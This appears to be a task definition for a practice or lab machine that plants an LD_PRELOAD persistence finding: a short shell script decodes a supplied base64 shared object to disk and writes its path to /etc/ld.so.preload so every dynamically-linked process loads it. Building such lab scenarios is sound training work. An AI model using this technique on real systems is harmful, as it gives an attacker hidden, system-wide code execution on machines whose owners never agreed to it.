name: ld-preload-persistence
description: Practice-box persistence finding: installs a shared object and points /etc/ld.so.preload at it, so the loader maps it into every dynamically-linked process. The shipped object must be a real, valid DSO (a text file here would make every binary print ld.so errors). Vars: LIB_PATH (required, absolute), SO_B64 (required, base64 of the shared object).
script:
#!/bin/sh
set -eu


: "${LIB_PATH:?LIB_PATH is required}"
: "${SO_B64:?SO_B64 is required (base64 of the shared object)}"

install -d -m 0755 "$(dirname -- "$LIB_PATH")"
printf '%s' "$SO_B64" | base64 -d > "$LIB_PATH"
chmod 0755 "$LIB_PATH"

printf '%s\n' "$LIB_PATH" > /etc/ld.so.preload
chmod 0644 /etc/ld.so.preload
